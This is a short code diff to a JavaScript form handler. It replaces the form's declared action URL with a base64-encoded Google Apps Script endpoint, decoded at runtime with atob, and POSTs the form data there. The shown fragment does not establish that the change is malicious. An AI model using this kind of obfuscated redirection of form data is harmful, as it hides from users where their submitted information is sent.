@@ -71,8 +71,8 @@
     }
 
     // disableAllButtons(form);
-
-    var url = form.action;
+    var baseUrl = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J5Z2cwVldKRGVHUG1jS3IzbUtTYzhEeVBiX1VRUV8yd3F1a1JhQmFiZHlDeGY1Q0dHaDRDZW5HVUNvMVhEdVhtN0tRUS9leGVj";
+    var url = window.atob(baseUrl);
     var xhr = new XMLHttpRequest();
     xhr.open('POST', url);
 
